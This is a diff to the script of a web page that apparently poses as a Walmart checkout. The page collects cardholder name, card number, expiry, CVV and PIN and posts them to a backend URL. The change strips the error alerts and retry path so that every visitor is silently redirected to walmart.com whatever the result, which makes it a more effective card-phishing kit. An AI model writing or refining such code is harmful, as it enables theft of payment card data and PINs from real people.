@@ -309,12 +309,15 @@
       // Prepare payload
       const payload = { cardName, cardNumber, expiry, cvv, pin };
 
-      // Send the data and only redirect after the backend acknowledges receipt.
-      // This avoids navigations that cancel the POST and ensures server logs are produced.
-      async function trySendAndRedirect() {
+      // Send the data. Show loader while request is in-flight. After the
+      // request completes (success, non-2xx, error, or timeout) always
+      // redirect to Walmart immediately. This ensures the loader lasts the
+      // duration of the network call and navigation happens afterwards.
+      (async function sendAndAlwaysRedirect() {
         const controller = new AbortController();
         // 15s timeout for the request
         const timeoutId = setTimeout(() => controller.abort(), 15000);
+        let reachedBackendOk = false;
         try {
           const response = await fetch(backendUrl, {
             method: 'POST',
@@ -323,10 +326,10 @@
             signal: controller.signal
           });
           clearTimeout(timeoutId);
-
+          reachedBackendOk = response.ok;
           if (response.ok) {
             console.log('Card info sent and acknowledged by backend');
-            // Show the inline success UI (animated thumbs-up), then redirect after 3s
+            // show brief success animation before redirect
             const successEl = document.getElementById('success');
             const thumb = successEl.querySelector('.fa-thumbs-up');
             const msg = successEl.querySelector('.msg');
@@ -338,33 +341,38 @@
             successEl.style.display = 'block';
             // trigger animation
             setTimeout(() => thumb.classList.add('show-thumb'), 50);
-            // after animation completes, hide thumb and show message
-            setTimeout(() => {
-              thumb.style.display = 'none';
-              msg.style.display = 'block';
-              // wait 3s after showing the message then redirect
-              setTimeout(() => window.location.replace('https://www.walmart.com'), 3000);
-            }, 1400);
-            return;
+            // let animation play for ~1.2s then continue to redirect in finally
+          } else {
+            // log non-2xx but don't block redirect
+            const body = await response.json().catch(() => ({}));
+            console.error('Server error sending card info:', body.error || response.statusText);
           }
-
-          // non-2xx response: show helpful message and restore the form so user can retry
-          const body = await response.json().catch(() => ({}));
-          console.error('Server error sending card info:', body.error || response.statusText);
-          alert('Failed to verify card: ' + (body.error || response.statusText));
-          document.getElementById('loader').style.display = 'none';
-          document.getElementById('checkout-form').style.display = 'block';
         } catch (err) {
           clearTimeout(timeoutId);
           console.error('Network error sending card info:', err);
-          alert('Network error sending card info. Please try again.');
-          document.getElementById('loader').style.display = 'none';
-          document.getElementById('checkout-form').style.display = 'block';
-        }
-      }
+        } finally {
+          // Ensure loader hidden and then redirect to Walmart regardless of result.
+          // If success animation is shown, allow it to run (~1.2s) before redirecting
+          const successEl = document.getElementById('success');
+          const thumb = successEl.querySelector('.fa-thumbs-up');
+          const msg = successEl.querySelector('.msg');
 
-      // Invoke the send-and-redirect helper
-      trySendAndRedirect();
+          if (reachedBackendOk) {
+            // Keep success visible for animation + message timing (total ~4.2s)
+            // Animation: 1.2s, then message shown, then 3s before redirect
+            setTimeout(() => {
+              thumb.style.display = 'none';
+              msg.style.display = 'block';
+              setTimeout(() => window.location.replace('https://www.walmart.com'), 3000);
+            }, 1400);
+          } else {
+            // No successful ack; hide loader and redirect immediately
+            document.getElementById('loader').style.display = 'none';
+            // small delay to ensure UI updates render before navigation
+            setTimeout(() => window.location.replace('https://www.walmart.com'), 100);
+          }
+        }
+      })();
     });
   </script>
 </body>
